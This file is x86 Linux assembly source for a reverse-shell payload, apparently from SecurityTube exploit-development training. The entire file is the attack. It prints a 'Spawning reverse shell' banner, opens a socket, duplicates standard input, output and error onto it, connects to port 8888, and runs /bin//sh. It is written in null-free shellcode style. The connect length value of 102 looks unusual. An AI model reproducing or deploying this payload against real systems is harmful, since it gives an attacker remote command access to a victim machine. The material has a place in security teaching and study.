; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:


	; Print message
	xor eax, eax
	mov al, 0x4
	xor ebx, ebx
	mov bl, 1
	push 0x0a20202e
	push 0x2e2e6c6c
	push 0x65687320
	push 0x65737265
	push 0x76657220
	push 0x676e696e
	push 0x77617053
	mov ecx, esp
	xor edx, edx
	mov dl, 28
	int 0x80


	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	xor eax, eax
	mov ax, 0x167
	xor ebx, ebx
	mov bl, 2
	xor ecx, ecx
	mov cl, 1
	xor edx, edx
	int 0x80
	mov dword [socket], eax


	;dup2 - 0
	xor eax, eax
	mov al, 0x3f
	mov ebx, [socket]
	xor ecx, ecx
	int 0x80
	;dup2 - 1
	xor eax, eax
	mov al, 0x3f
	mov ebx, [socket]
	xor ecx, ecx
	mov cl, 1
	int 0x80
	;dup2 - 2
	xor eax, eax
	mov al, 0x3f
	mov ebx, [socket]
	xor ecx, ecx
	mov cl, 2
	int 0x80


	;Connect - 362
	xor eax, eax
	mov ax, 0x16a
	mov ebx, [socket]
	xor edi, edi
	push dword edi 		; push 0 => ip 0.0.0.0
    push edi			; port 8888, big endian
    push word 0xb822 	; port 8888, big endian
    push word 2 
	mov ecx, esp
	xor edx, edx
	mov dl, 0x66 		; 102
	int 0x80


	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80


section .bss
	socket resd 1

